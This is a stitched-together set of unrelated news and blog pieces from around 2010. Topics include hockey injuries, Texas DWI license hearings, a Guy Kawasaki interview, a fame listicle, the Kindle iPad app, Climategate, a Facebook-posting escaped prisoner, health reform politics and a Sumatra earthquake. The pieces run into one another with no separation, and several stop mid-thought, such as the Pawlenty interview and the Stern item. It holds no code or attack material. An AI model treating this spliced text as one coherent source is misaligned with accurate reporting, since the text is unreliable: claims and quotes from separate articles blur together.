I feel these issues have to be resolved and the good thing is that it does not require any changes in the Javascript language itself , nor its browser support .
If the different framework vendors would just agree on a single base library that they all use , because , let ’s face it , everybody needs a function to trim strings and a proper set implementation , a clean way of doing inheritance , plus a module system to go with that , be it dojo / Google ’s system or a CommonJS variant , I do n’t care .
It would be oh - so - nice to have a de- facto standard library for this stuff .
DETROIT -- Defenseman Niklas Kronwall skated Thursday morning with a new knee brace that he hopes will better support his injured left knee .
But he missed his fourth consecutive game for the Red Wings .
" It feels better today than yesterday , so I 'm taking a step in the right direction , " Kronwall said .
Kronwall hopes to play Saturday against Ottawa but said he might be forced to withdraw from the Swedish Olympic team if he misses that game , too .
He has kept Swedish coach Bengt - Ake Gustafsson updated with his progress .
" But at the same time , my focus right now has to be coming back to play for the Red Wings , " Kronwall said .
" We have a couple of huge games before the break , we want to do everything we can to win those games . "
Babcock said he has no idea about Kronwall 's status .
" We brought him back from injury ( sprained MCL ) way longer after we expected .
We thought he was out for four weeks and then he was out for forever , " Babcock said .
" We thought he was as healthy as can be .
He kind of got hit from behind in the leg ( in San Jose on Feb . 2 ) and then he was fine , no problem .
He practiced the other day , was fine .
He got on the plane , he could n't move . "
Odds & ends
• Following Thursday's 3 - 2 shootout loss , Babcock said he will split Pavel Datsyuk and Henrik Zetterberg to give the club more balance , now that it has more depth .
" That line ( with Johan Franzen ) was very dominant ( Thursday ) , " Babcock said .
" Now , we 'll split those guys up , Pav and Z , and we 'll get four lines and can really come at teams and make sure each line has a net presence on it .
We did n't do it today because we had n't practiced with it .
But that 's been our plan here for a while , and we 'll spread that out . "
• Tomas Holmstrom returned after missing one game with a bone bruise in his left knee .
He played on the fourth line with Drew Miller and Jason Williams and on the first power - play unit .
He had one assist in 13:28 .
If the State of Texas charges you with Driving While Intoxicated ( DWI ) it is extremely important that you get in touch with an experienced DWI attorney as soon as possible .
The unique nature of these allegations requires that you be represented by someone with significant experience and expertise in the field of Criminal law .
There are several important things that must be taken care of in an expedited fashion to preserve your rights .
First , in the State of Texas you should always request within 15 days a hearing from the Texas Department of Public Safety to challenge the revocation of your Drivers License .
If you refused an Officer ’s request for a sample of Breath or Blood after being arrested , your license will be suspended for 6 months starting 40 days from the date of arrest .
If you voluntarily submitted to the Officer ’s request and your Blood Alcohol Concentration ( BAC ) was over 0.08 , your license will only be suspended for 90 days .
To keep this from happening it is extremely important to challenge the State ’s revocation of your license .
Q. Tell me about the best bosses you worked for .
A . My boss in the jewelry business was great because he taught me how to sell and how a business reputation was built on trust .
My boss at Apple was a guy named Mike Murray , who was the director of marketing of the Macintosh division .
He gave me so much rope that I could hang myself and sometimes I did .
After a while , your neck gets stronger and you also learn not to hang yourself .
A few levels above me , I learned from Steve Jobs that people can change the world .
Maybe we did n’t get 95 percent market share , but we did make the world a better place .
I learned from Steve that some things need to be believed to be seen .
These are powerful lessons — very different from saying we just want to eke out an existence and keep our heads down .
Q . So how do you create a sense of mission in a company ?
A . The foundation is the desire to make meaning in the world — to make the world a better place .
We believed in the Mac division that we were making the world a better place by making people more creative and productive .
Google , at its core , probably believes it ’s making the world a better place by democratizing information .
So it starts from this core of how you make meaning , which translates into some kind of physical product or service that actually delivers .
Q. How do you hire ?
A . The most important thing is that you hire people who complement you and are better than you in specific areas .
Good people hire people better than themselves .
So A players hire A+ players .
But others hire below their skills to make themselves look good .
So B players hire C players .
C players hire D players , etc .

ST . JOHN'S , N.L. —
The decision by Newfoundland and Labrador Premier Danny Williams to go stateside for heart surgery has provided ammunition for opponents of health care reform in the United States .
The blogosphere was abuzz about the move Tuesday as anti-reformists trumpeted apparent weaknesses in Canada 's health care system , a model some proponents of reform have suggested the U.S. should emulate .
Some pointed to it as proof of weaknesses in Canada 's universal health - care system and vindication for those who oppose U.S. President Barack Obama 's plans to overhaul the system south of the border .
A posting on right - wing website redstate.com entitled , “ But I thought Canada 's health care system was so much better , ” drew nearly 20 responses taking aim at the Canadian system .
“ That 's like the premier of China coming here for a decent egg roll , ” read one comment .
“ It must be pretty bad when even someone with his clout skips town for medical help . ”
Others wondered about all the fuss when someone uses their considerable personal financial resources to seek the best available treatment .
“ Health care is there for anyone who can afford it , ” one reader wrote on politico.com , another popular U.S. site .
“ It cracks me up when top tier folks get treatment in U.S. ( medical ) facilities and the right sees vindication . ”
Defenders of the status quo in the U.S. accused Williams of hypocrisy .
“ How is it that the Canadian health care system is just fine for all the little people , but when a provincial premier hears the thump of mortality in his chest , it 's off to Cedars - Sinai , Sloan - Kettering , or Mayo ? ” Dale Franks wrote onwww.cando.net.
“ But do n't worry .
When we get our free health care down here in the US , everything will be tiddly . ”
While much of the web chatter had a negative tone , not all of those weighing in described the premier 's decision as a sign of weakness in Canada 's health care model .
One Politico reader suggested that Williams , whose known for his often adversarial relationship with the federal Conservative government , was well aware of how the move might reflect on Ottawa .

“ Danny Williams is known for trying to embarrass the Canadian government , ” he wrote .
“ The reason he 's going down south is because he can afford the $ 50,000 cost of getting surgery . ”
Many people around the world dream of being in the spotlight !
The lights , the money , the attention … how could anyone not want to be generally loved and appreciated by the masses ?
Well hopefully this list will show you ways of making that dream come true for you .
As Gilderoy Lockhart from ‘ Harry Potter ’ once said ‘ Fame is a fickle friend ’ .
10 Reality TV
Or , how reality killed the video star
Most people around seem to know someone who has a friend who has been on a reality television show .
There is so many around these days , and they are so loved , that it is a seemingly easy way to become famous .
You do n’t even have to be talented !
The late Jade Goody ( British Big Brother ) rose to fame showing no desirable talent , simply for being wonderfully unintelligent .
On the other hand if you are talented than reality television is a whole lot easier to not only become famous but maintain fame for a long career , for example Leona Lewis and the British singing show the X - Factor .
9 Timing
Or , being in the right place at the right time
Something heroic is your best bet for that special time in the spotlight .
Okay , this one is a little hard to achieve as it consists of no purposeful input into the situation , you just have to be lucky !
But being in the right place at the right time and doing the right thing is a real good way of becoming famous .
For example Mr. Autry ( pictured above , left ) saved a man who fell onto the New York subway tracks .
He was walking back from his kids school when a man fell onto the tracks , he made a quick decision and leapt onto the track and pushed the man flat against the floor so the train flew over them , they were both fine afterwards .
Mr. Autry was all over the news and was a guest on Jay Leno ’s Tonight Show .
8 Win a World Record
Let ’s face it , while flicking through a world record book one usually sees the most bizarre and utterly pointless records you could dream of .
Why ?
Because they are unique enough to become recognized !
For example there is currently a Guinness world record for most people performing a toast .
This is a very easy one to break , just get a lot of people in one place at one time and raise their arms …
Could n’t be simpler .
You do n’t even have to succeed at breaking a record .
A contestant on popular talent show ‘ Britain ’s got talent ’ was famed , particularly on YouTube , by failing to eat as many chocolates in a minute !
7 Copyright Theft Or , plagiarizing something and never confessing
This is a simple concept ; find something which is relatively good but not well known , for example a song , and copy it !
For example Naomi Shemer , who features on another listverse list : Top 10 Fascinating Deathbed Confessions , was a famous Israeli songwriter who was accused of plagiarizing her most famous song ‘ Jerusalem of Gold ’ from an Israeli lullaby .
Although many speculated that she copied her song ( which probably added to her fame ) she never confessed until on her deathbed in 2004 .
6 Charity Or , doing something generous that most people would n’t
Giving up a vast amount of money or even a little of your time is a very good way of getting on the front page of at least your local newspaper .
Think about it …
Gandhi went on a walk !
Enough said .
For example Heather Mills has done nothing but volunteer work and is famous throughout Britain .
Oh but Heather was married to Beatles rock star Paul McCartney , which brings us nicely to the next item .
5 Relations
Or , marry someone famous or be related to a celebrity
This is a good one , as like reality television , requires no talent whatsoever , except perhaps good looks …
Is that a talent … ?
Anyway , a good example of someone who is simply related to a famous person is Paris Hilton … nice .
Do n’t wait to be famous , date to be famous !
4 Self - Shaming
Or , post something weird , funny , humiliating or dangerous on the Internet
The world of fame has been transformed by the internet and specifically You Tube .
This is probably the easiest way of becoming famous … you do n’t even need to leave your house .
All you need is a camera and a relatively good idea , actually not even a good idea .
The seemingly pointless videos “ Charlie bit me ” rose to fame for … well … no reason at all !
People simply found it amusing .
Another great example of You Tube Fame is Chris Crocker with his ( or her… not really sure ) “ leave Britney alone ” video , which became so famous it even got into a film !
3 Invent Something
This is hard as it is hard for the normal human mind to think ‘ out - of - the - box ’ and invent something the world will appreciate .
Most inventions seem to have already been made !
However creating something which drastically changes lives is a shore way of becoming famous .
Try to look around and see problems in the world which could be fixed , is there something already invented which could be improved ?
The best invention to get generally loved by people is surly a cure !
So get your rubber gloves and long white coats out and find a cure for cancer !
Good luck !
Oh by the way - many inventions were created by accident so just play around with everything and see what comes out !
2 Real Talent
Or , have real talent , or do something most people would love
The most dignified , deserving and profitable way to rise to fame is simply to be talented ( admittedly easier said than done ) .
If you can sing , then sing .
If you can act , then act .
If you can do anything talented , do it and do it well .
If others share the enthusiasm you do then you will be famous !
This is n’t as hard as many think if you are talented , for example ;
The music industry is so vast , with many genres , if you ca n’t get recognized in your own genre than pursue a relatively unknown one , like rock opera… awesome !
1 “ Kill a prostitute ”
DO NOT GO AND KILL ANYONE !!
“ Kill a prostitute ” was an answer given by English comedian Rickey Gervais in an interview after being posed the question , “ What advice would you give those who want to become famous ? ”
What Rickey meant by this was that if fame is your only driving force , all you care about and all you think about , than surely you wo n’t mind doing something horrendous to get it .
Fame should n’t be what you desire ; a philosopher once said “ fame is a by - product of courageous acts ” , or something along those lines .
What is meant is that one should desire to fulfill a noble act , and fame should come naturally as a result .
Amazon has announced Kindle Apps for Tablet Computers ( including Kindle for iPad ) , a rather polished e-reader application that both makes the Kindle itself look rather old - fashioned and explains why last week 's Mac version was so unfinished :
The Amazon developers have clearly been spending all their time on this instead .
The app offers all the usual Kindle features : Whispersync to keep your bookmarks and notes in sync between devices and the ability to load up any books you have previously bought .
It also adds a lot of visual polish , from the obligatory page - turn animation ( you can switch it off ) to a fetching , full - color grid view of your library .
You can adjust " paper " color , and change screen brightness from within the app .
Most interesting , though , is the way you buy books , which circumvents Apple 's 30 percent cut of in - app purchases .
When you buy books , you are sent to the Kindle store in a web browser to make your purchase ( Amazon does n't say whether the screenshot comes from an in - app browser page , or Mobile Safari itself , but it makes no difference ) .
We also see a page on display which has a full - color photo .
This will be ideal for cookbooks bought from Amazon , but it also sends Amazon 's own grayscale - only hardware to the back of the line .
Still , the effort Amazon seems to have put in show that it is clearly focused on selling books , not the hardware the books are read on .
That the app is almost certain to make it into the App store shows that the reverse is true with Apple :
It wants the iPad to be the go - to media device , whatever that media may be .

Today ’s idea :
We ’re becoming a “ neurocapitalist ” world , an essay says .
The demands of performance - driven , self - enhancing societies will expand markets for neuro - psychotropic drugs beyond those for depression , dementia and attention deficit disorder .
And they will cost our health care systems dearly .

Health | Historical forces are converging in favor of the neurosciences , write Hennric Jokeit and Ewa Hess in an essay translated on Eurozine ( originally published last year in the German cultural journal Merkur ) .
The authors , respectively a neuropsychologist and a journalist , both based in Zurich , say the neurosciences today enjoy a status comparable to psychoanalysis in the 20th century .
“ Psychoanalysis was successful because it wove together medically relevant disciplines like psychiatry and psychology with art , culture , education , economics and politics , allowing it to penetrate important areas of social life , ” they write .
“ At the beginning of the 21st century , the neurosciences seem to be in a position to take on a comparable role in the future . ”
But neuroscience has a leg up on psychoanalysis , the authors say in an article that does n’t skimp on Marxist references :
… The neurosciences are extremely well funded by the state and even more so by private investment from the pharmaceutical industry .
Their prominent status can be explained both by the number and significance of the problems they are attempting to solve , as well as the broad public recognition of these problems , and by the respectable profits to be made should they succeed .
In other words , they are driven by economic and epistemic forces that emanate from the capitalism of today , and that will shape the capitalism of tomorrow – whatever that might look like .

They approached the King of All Media after he repeatedly mentioned on - air that his exclusive Sirius XM Radio deal expires next January and he was open to other offers .
Cowell was paid $ 50 million a year .
A source connected to “ Idol ” said , “ It ’s one of the few shows that could compete with Stern ’s $ 100 million - a- year Sirius contract , and ‘ Idol ’ bosses think he’d be even nastier than Simon .
“ They know he would be great TV and would clash with the other judges such as Ellen DeGeneres and the contestants .
‘ Idol ’ will do what it takes to sign him . ”
But a second source told us Stern has n’t made the “ Idol ” talks easy , and has been giving out mixed messages about his intentions .
“ Despite what he ’s been saying on - air , Howard is n’t ready to leave radio and would like to stay on at Sirius , ” the source said .
“ We believe this is a ploy to make Sirius pay up and keep him on his huge contract .
But if Sirius can’t pay him the money he wants , he may negotiate to film ‘ Idol ’ on the side . ”
Stern is also believed to be reluctant to commit to a show that would require him to tour the US as a judge and spend much of the year in Los Angeles .
He recently said , somewhat cryptically , “ I was approached by a major TV network to take over a TV show and leave here and do that next year — and I did turn it down . . .
I ’m not even sure if I want to be working .
I ’m waiting to see what happens . ”
Calls to Stern ’s agent and producer were not returned .
A rep for FOX declined to comment .
Australian internet rights groups fear a piracy court case could force internet service providers ( ISPs ) to become " copyright cops " and cut web access to customers who illegally download .
The Federal Court is on Thursday expected to hand down its judgement in the case , which has pitted Hollywood and Australian film and TV producers against Australia 's third - largest internet provider , iiNet .
The entertainment companies , which include Village Roadshow , Paramount Pictures Australia and Twentieth Century Fox International , say iiNet has not done enough to stop its customers illegally sharing movies on the net .
But iiNet argues it has never encouraged or authorised the illegal sharing or downloading of files in breach of copyright laws and specifically warned its users against doing so .
Electronic Frontiers Australia , which aims to protect the civil liberties of internet users , said the case goes further than any other similar case seen around the world in holding an ISP responsible for a customer 's illegal activities .
What ’s the U.S. policy on coups d’etat ?
The Obama administration ’s quick condemnation of last year ’s coup in Honduras and repeated ( though ultimately unsuccessful ) demands that leftist President Manuel Zelaya be reinstated , seemed to be an indication that the United States would no longer tolerate military coups , no matter how unsavory or anti-American the leader overthrown .
That ’s why it was a little surprising to see that the State Department ’s first response to the overthrow of President Mamadou Tandja in Niger yesterday was essentially " he had it coming " :
" President Tandja has been trying to extend his mandate in office .
And obviously , that may well have been , you know , an act on his behalf that precipitated this act today , " he said .
Crowley was quick to stress that the United States does " not in any way , shape or form defend violence of this nature .
" Clearly , we think this underscores that Niger needs to move ahead with the elections and the formation of a new government , " he added , noting that Washington still had few details of what actually took place in Niger .
( Emphasis Mine . )
Had n’t Zelaya also been attempting to extend his mandate by extra-constitutional means before he was unceremoniously sent packing by his own military ?
Why is Tandja ’s reinstatement not a precondition for the restoration of democracy ?
Granted the international context of the two situations is quite different .
Tandja was a pariah , even in his own region , whereas Zelaya had the support of other Latin American governments .
However , even ECOWAS , the West African body that had suspended Tandja ’s membership , has been outspoken in condemning his ouster .
It ’s possible that a more full - throated condemnation is coming , but it ’s important the the U.S. avoid even tacit acceptance of coups as a method of changing government .
The fact that the United States no longer supports or tolerates coups as it did during the Cold War is likely a large factor in why they ’re not as common or as disastrous as they used to be .
Square Enix has gone one step further in its plot to become the most pretentious game publisher in the world , trademarking its own magical currency for real - world transactions .
The worst part is , it 's not even Gil !
It 's some flowery and awful - sounding moon money called Crysta , and if you 're buying from Squenix in Japan , you need it .
Following in the tradition of Microsoft and Wii Points , Crysta will be required for online Japanese games like Party Castle and Fantasy Earth Zero .
It 's also the only way for players to obtain soundtracks from Squenix 's E - Store .
One imagines that , if successful , Crysta will bleed into other Square Enix games .
Here 's the stupid part , though : one Crysta exactly equals one Yen .
That 's right , Crysta is just Japan 's normal currency , but rebranded .
This essentially means that Crysta 's sole purpose is to confuse people and add an extra , totally unnecessary step to the online transaction process .
Hilarious .
This is the point at which online toy money jumps the shark .
As the son of a Palestinian refugee expelled from his native homeland , there are few things I cherish more than my gift of freedom .
However , being born and bred in Australia has not shielded me from being tagged with a label that is the unfortunate lot of all first - generation Palestinians .
To some , we simply do not exist , and when we do , we are terrorists , animals or sub-human .
Such deliberate misrepresentations and stereotypes are constantly propagated , but to read unsubstantiated claims about Palestinians in a serious newspaper ( Julie Szego , Comment , 3/3 ) was highly offensive .
Over the years , Palestinians have been accused of terrible things .
The Israelis claim that we use our children as human shields .
Despite propagating this lie repeatedly , Israel has never provided conclusive proof of it .
Nonetheless , the lie has come to be accepted as ' ' truth ' ' .
Yet contrary to such misconceptions , Amnesty International says in its report '' Israel / Gaza Operation ' Cast Lead ' : 22 days of death and destruction '' that it was Israeli soldiers who used Palestinians as human shields .
Amnesty 's conclusion was unambiguous .
It " did not find evidence that Hamas or other Palestinian groups violated the laws of war to the extent repeatedly alleged by Israel …
In particular , it found no evidence that Hamas or other fighters directed the movement of civilians to shield military objectives from attacks . "
But it did find '' that Israeli forces on several occasions during Operation ' Cast Lead ' forced Palestinian civilians to serve as ' human shields ' . ''

Pizza
Hut is to remove all self - service salad carts from its 440 restaurants in China .
Up to now , customers were permitted just one trip to the salad cart , but these restrictions have led to ingenious Scooby snack - style stacking of CCTV Tower proportions .
The chain , the first to introduce pizza to China in 1990 and pizza delivery in 2001 , claims that the move is part of a general menu expansion , but it 's surely down to salad cart abuse .
Salad stacking has become somewhat of an art form , with ingenious engineers exchanging tips online , such as having a base of carrots for a stable foundation .
I think the smart move for Pizza Hut would have been to reduce the size of the salad plate to roughly the diameter of tomato slice .
Then only the most talented stackers could take any more than their fair share .
Over in Sanlitun , Purple Haze Bistro is upping sticks due to disputes with the neighbors at China View .

In The Tom Peters Seminar , the business guru who goes by that name celebrated the fact that only some 10 % of the price of his new Minolta camera resulted from materials and labor .
The rest was “ ephemera ” and “ intellect . ”
That means , translated from Peters - speak into English , that only a tenth of the hours we work to pay for a piece of consumer electronics go to pay the production cost ; the rest go to embedded rents on artificial property rights .
Now Rob Carlson reports recent information that sheds new light on this contention .
He cites Joel Johnson ’s inadvertent admission that only 8 - 10 of the people at Aliph working on Bluetooth headsets are actually necessary to carry out or coordinate the production process .
The rest are involved in administration and marketing .
And the total cost of manufacturing ( outsourced to China ) amounts 5 % or less of retail price .
The proprietary software of the iPhone probably adds around $ 30 to the price .
On the other hand , the material components of a typical smart phone cost around $ 170 - 180 .
So total production cost is a little over $ 200 , and the rest of the $ 500 - 600 price is retail markup and rents on proprietary design .
The remaining unanswered question , to make sense out of all this , is the cost breakdown of the components themselves .
How much of the price of the components reflects the actual cost of producing them , as opposed to rents on proprietary design ?
How much of it is just administrative overhead from conventional corporate modes of organization ( Weberian work rules , job descriptions , mission statements , and all the rest of it ) ?
I suspect it ’s a lot , if the efficiencies hardware hackers typically achieve in reverse - engineering proprietary designs are any indication ( Factor Twenty cost reductions are not unusual ) .
Carlson himself , in the same post , goes on to describe how Biodesic ‘s improvements in manufacturing processes and component designs are resulting in radical cost reductions , further blurring the boundaries between physical components and bits .
I ’d be interested in any light the readers could shed on how much of the price of iPhone components results from proprietary design , administrative overhead , etc .
I ’m inclined to believe that conventional manufacturing is riddled with overhead costs in a manner comparable to a human body with congestive heart failure , bloated with edema from head to foot .
Climategate just gets more interesting all the time does n't it ?
The Guardian is reporting that the Climatic Research Unit ( the U.K. research group at the center of the Climategate affair ) has somehow lost critical temperature data again , in this case data from Chinese weather stations that are supposed to prove that the urban heat island effect accounts for a neglible portion of the warming trend found in temperature records .
The abstract for the study published in 1990 in Nature reads :
Records of hemispheric average temperatures from land regions for the past 100 years provide crucial input to the debate over global warming .
Despite careful use of the basic station data in some of these compilations of hemispheric temperature , there have been suggestions that a proportion of the 0.5 °C warming seen on a century timescale may be related to urbanization influences — local warming caused by the effects of urban development .
We examine here an extensive set of rural - station temperature data for three regions of the world : European parts of the Soviet Union , eastern Australia and eastern China .
When combined with similar analyses for the contiguous United States , the results are representative of 20 % of the land area of the Northern Hemisphere and 10 % of the Southern Hemisphere .
The results show that the urbanization influence in two of the most widely used hemispheric data sets is , at most , an order of magnitude less than the warming seen on a century timescale .
The Guardian notes :
But many climate sceptics did not believe the claim .
They were convinced that the urban effect was much bigger , even though it might not change the overall story of global warming too much .
After all , two - thirds of the planet is covered by ocean , and the oceans are warming , too .
But when Jones turned down requests from them to reveal details about the location of the 84 Chinese weather stations used in the study , arguing that it would be " unduly burdensome " , they concluded that he was covering up the error .
And when , in 2007 , Jones finally released what location data he had , British amateur climate analyst and former City banker Doug Keenan accused Jones and Wang of fraud .
He pointed out that the data showed that 49 of the Chinese meteorological stations had no histories of their location or other details .
These mysterious stations included 40 of the 42 rural stations .
Of the rest , 18 had certainly been moved during the study period , perhaps invalidating their data .
Keenan told the Guardian : " The worst case was a station that moved five times over a distance of 41 kilometres " ; hence , for those stations , the claim made in the paper that " there were ' few if any changes ' to locations is a fabrication " .
He demanded that Jones retract his claims about the Chinese data .
Now Phil Jones , the head of the CRU and his Chinese - American colleague Wei-Chyung Wang , from the University of New York at Albany are admitting that the data are lost .
Even more damningly , the Guardian reports :
The story has a startling postscript .
In 2008 , Jones prepared a paper for the Journal of Geophysical Research re-examining temperatures in eastern China .
It found that , far from being negligible , the urban heat phenomenon was responsible for 40 % of the warming seen in eastern China between 1951 and 2004 .
This does not flatly contradict Jones 's 1990 paper .
The timeframe for the new analysis is different .
But it raises serious new questions about one of the most widely referenced papers on global warming , and about the IPCC 's reliance on its conclusions .
Lest the faith in the scientific consensus be shaken further by these revelations , the Guardian article hastens to add :
It is important to keep this in perspective , however .
This dramatic revision of the estimated impact of urbanisation on temperatures in China does not change the global picture of temperature trends .
There is plenty of evidence of global warming , not least from oceans far from urban influences .
A review of recent studies published online in December by David Parker of the Met Office concludes that , even allowing for Jones 's new data , " global near - surface temperature trends have not been greatly affected by urban warming trends . "
On the other hand , I reported on a recent study by University of Alabama at in Huntsville climatologist John Christy which finds that improperly accounted for heat island effects may be distorting temperature trend data :
In an email to University of Alabama climatologist John Christy I asked , " Is there a possibility that the teams that compile temperature data could all be making the same set of errors which would result in them finding similar ( and perhaps ) spurious trends ? "
Christy replied that he believed this was possible and cited some recent work he had done on temperature trends in East Africa as evidence .
In that article he found that using both the maximum and minimum temperature rather than the mean temperature ( TMean ) used by the three official data sets gives a better indication of actual temperature trends in the region .
Christy found that the maximum temperature ( TMax ) trend has been essentially zero since 1900 while the minimum temperature ( TMin ) trend has been increasing .
In his email to me , Christy explained , " As it turns out , TMin warms significantly due to factors other than the greenhouse effect , so TMean , because it is affected by TMin , is a poor proxy for understanding the greenhouse effect of ' global warming ' . "
Or as his journal article puts it , " There appears to be little change in East Africa 's TMax , and if TMax is a suitable proxy for climate changes affecting the deep atmosphere , there has been little impact in the past half - century . "
So if Christy 's analysis is correct , much of the global warming in East Africa reported by the three official data sets is exaggerated .
Christy has found similar effects on temperature trend reporting for other regions of the world .
What could be increasing minimum temperatures ?
Christy 's study suggests that the turbulence and thus temperatures in the lower levels of the atmophere are …
… highly dependent on local land use and perhaps locally produced aerosols , the significant human development of the surface may be responsible for the rising TMin while having little impact on TMax in East Africa .
In any case , Phil Jones and the CRU crowd are in the process of finding out the truth of the old adage , " It 's not the crime , it 's the cover up " that eventually brings someone down .
* Since the Climategate story appears to be far from over , I have decided a sequential numbering of updates will help readers keep track of developments .
It ’s obvious that many of the buildings that collapsed during the Haitian earthquake were poorly designed or constructed .
In Haiti , because there is virtually no lumber for building , structures have been made of concrete blocks , often with inadequately reinforced concrete frames .
But to suggest that the country simply be rebuilt to a technically higher standard is to take a shortsighted approach .
An internationally financed rebuilding effort , involving scores of architects and engineers drafted to work with the Haitian authorities , should take a longer view of Haiti ’s future , supporting a gradual , profoundly well - thought - out physical transformation .
Their work will demand determined physical reinvention and , where appropriate , architectural innovation .

Haiti ’s government had already begun considering new planning and building codes .
It ’s still crucial to finish that job , to establish standards that not only reduce the risk that structures will collapse in hurricanes and earthquakes but also help Haiti build for the future .
But this is n’t just a question of better - quality steel and concrete ; it ’s also about choosing where not to build .
Far too many buildings in Haiti have stood on deforested , unstable hillsides , and new building strategies must dovetail with environmental repair schemes .
Stupid criminals and Facebook do n’t go together .
Just ask Joseph Luebke , a convicted burglar in state prison .
Luebke , 19 , of the Chicago suburb of Romeoville , was just months away from finishing a prison term for burglary at a halfway house .
But his feet got itchy , authorities say , so on St. Patrick ’s Day , he skipped .
Then he Facebooked all about it .
Advertisement
Until then , he ’d spent nights sleeping at the halfway house and days working as a telemarketer .
On his Facebook page , he described it as “ selling rich people vacations .
Yeah , it is what u think it is .
legit hustle . ”
He also listed as his interests , “ my money , my mob , my life , my family and my FREEDOM . ”
“ Mr. Luebke broke custody at about 6:45 p.m. on Wednesday , March 17 , ” Illinois Department of Corrections spokeswoman Januari Smith said .
A mere 18 minutes later , there was a status update on his Facebook page .
Advertisement
“ On da run . . . ”
The entry amazed some of his 526 Facebook friends .
“ Waaaat u better not be , ” wrote Gina .
“ JOOOEEE YOUR SO DUUUMMBBB !!!!!! ”
Danielle chimed in .

At 8:44 p.m. , his mom wrote : “ joe call me cuz now I ’m freakin out !!!!!!! ”
Luebke responded about an hour later : “ Ma , i need u to get my property plz .
ill get an outfit from u some how . ”
As he blogged , corrections officialssent an alert about an escaped prisoner .
Cook County Sheriff Tom Dart sent up the county ’s helicopter and unleashed the canine unit .
The U.S. Marshals Service sent out the Fugitive Task Force .
And Luebke ’s fingers kept blogging .

“ its all good imma be fine jusfine do n’t trip ! ” he wrote at 9:53 p.m .
On Luebke ’s Facebook page , he lists that he ’s a White Sox fan and likes reading John Grisham and Stephen King .
And he uses the phrase “ amor de konejo , ” or “ rabbit love ” in Spanish -- at least when it ’s spelled correctly , with a C , as conejo .
Gang investigators know it as a slogan for the Two Sixes , a Chicago gang that uses a rabbit head as a symbol .
“ im outta the joint for a coupla days to have some freedom for a minute , ” Luebke wrote .
“ i cant give locations and its a good chance i get caught but ill holla bakk .
im fine . ”

Investigators said Luebke apparently was fired from his telemarketer job on March 17 and thought he’d be sent back to prison to serve the rest of his six - year sentence .
He ’d spent just nine months at the medium - security Shawnee prison before graduating to the halfway house .
So he ran free .
Later on the night he was blogging , he wrote that he planned to see his mom : “ one more visit before i go back .
well let you know when .
im deleting these posts in an hour ! ”
That was at 11:43 p.m .
And 42 minutes later , authorities said , Luebke was apprehended at a relative ’s home .
Smith confirmed that he ’s back in custody .
But she would not say whether authorities used the Facebook posts to track him down .

Now Luebke ’s in the big house at Joliet .
That ’s not nearly as nice as calling rich people on the phone to sell them exotic vacations .

It ’s been an exceptionally long year for the president , his party , the Democratic caucuses in the Congress and everyone who was involved in whatever fashion in the 2008 election .
A year ago , the Health Care debate got started in a climate in which there was little doubt that the president would pass his plan , and soon .
That reality was most clearly expressed in the stance adopted by the key industry stakeholders who wanted to be in the discussion and on board rather than in opposition to it .
They figured that passage was a done deal and wanted to affect the final bill in their favor as much as possible rather than waste time opposing it .
Then the debate dragged on over many months .
The pace slowed in the early summer .
Then there was the town hall Crazy ™ of August .
And from there we know the rest — the ugliness , close calls , the shuddering collapse of morale after January 19th .
But the truth is , nothing matters but the final result .
No one remembers the politicking in advance of Medicare or Social Security or really anything else .
There ’s either a reform law or there ’s not .
That ’s why , even though it ’s still a momentous event in political circles , the 1994 run at Health Care Reform might as well never have happened .
Even over the last two days you ’ve seen a shifting of perspective as all the drama and angst of recent months recedes before the reality of final passage .
There ’s no denying this is certainly the biggest and by almost any definition the first major social legislation in the United States in almost five decades .
( Congress passed Medicare in 1965 . )
Today , when David Frum wrote that this was turning out to be the GOP ’s Waterloo , he had two interlocking points — one focused on policy , another political .
The US has had several runs with major pieces of social legislation .
And the record is that they do n’t get repealed .
They ’re expanded and become embedded in the national political economy .
That was what was at the heart of Bill Kristol ’s famous ( or infamous ) memo on reform from 1994 .
Once Health Care reform is passed ; the middle class will like it .
And there will be no repealing or doing away with it .
And its success would create a new generation of Democrats .
That was his fear .
To that end , Frum ’s policy point was , who cares if the Republicans take back Congress ?
Majorities come and go .
But reform is permanent .
For conservatives it ’s a catastrophic development and if they ’d actually been part of the dialog they probably could have gotten a bill much more to their liking .
The second point is political , though he ’s less clear in this case .
Republicans , he says , are probably overestimating their chances this fall in any case .
I ’m far from wanting to hazard a prediction .
But I ’ve thought for a while that this is right .
Seven months is always a long time in politics .
But this seven months particularly could be very long indeed .
I was in DC last week .
And I was again struck , as I used to be when I lived there ( 1999 - 2004 ) , by the powerful group - think that affects the place .
It ’s really no different than you ’d see in any other company town .
But it ’s pervasive and hard to escape .
When I was training down I read an update from a campaign watcher whose work I normally greatly respect .
He clearly believed that Health Care Reform was not only a catastrophe for Democrats but that the actual passage of the bill would have no political effect .
According to him , we ’re on pretty much a straight line between today and the November elections .
Again , I do n’t want to paint any rosy pictures .
And , as I said , I do n’t want to hazard any predictions .
But I think this conventional wisdom is quite mistaken .
Hard fought victories do n’t deplete political capital ; they build it .
And political wins themselves often have a catalyzing effect that shapes political opinion far more than we realize .
Make no mistake , it ’s a genuinely historic moment , a realization that only now seems to be dawning on people .
And expect to have political repercussions far greater than people expect .
But as I wrote earlier , even if they lose their majorities in November , they ’ll be able to say :
This is what we used these majorities to do .
And it was worth it .
( CNN ) --
A strong earthquake with magnitude 6.5 struck Friday night in the ocean southwest of Sumatra in Indonesia , the U.S. Geological Survey said .
The quake , which occurred shortly after 11 p.m. , was centered about 100 miles ( 165 kilometers ) west of Bengkulu in Sumatra , and 215 miles ( 345 kilometers ) south of Padang , Sumatra , the USGS said .
The center was 13.7 miles ( 22 kilometers ) deep , the USGS said .
There were no immediate reports of damage or injuries .
The Pacific Tsunami Warning Center did not issue a warning after the quake , but said there was a " very small possibility of a local tsunami that could affect coasts " no more than 62 miles ( 100 kilometers ) from the earthquake 's epicenter .
" Authorities in the region near the epicenter should be made aware of this possibility , " it said .
The Indonesian Meteorological and Geophysics Agency also did not issue a tsunami warning .

Emergency rooms should be able to turn patients away to cut costs , Minnesota Gov. Tim Pawlenty ( R - Minn . ) said last night
Appearing on Fox News 's " On the Record with Greta Van Sustren " last night , Pawlenty said the federal law that mandates ER treatment should be repealed .
" Well , for one thing you could do is change the federal law so that not every ER is required to treat everybody who comes in the door , even if they have a minor condition , " Pawlenty said .
" They should be -- if you have a minor condition , instead of being at the really expensive ER , you should be at the primary care clinic . "
Supporters of the federal law would content that many people go to ERs precisely because they do not have the insurance to pay for a primary care physician .
Van Susteren was also skeptical about Pawlenty 's proposal , pointing out that it 's difficult to tell what 's a minor condition without treating it .
VAN SUSTEREN : OK .
OK .
But you come in with chest pains , and like , you get horrible chest pains .
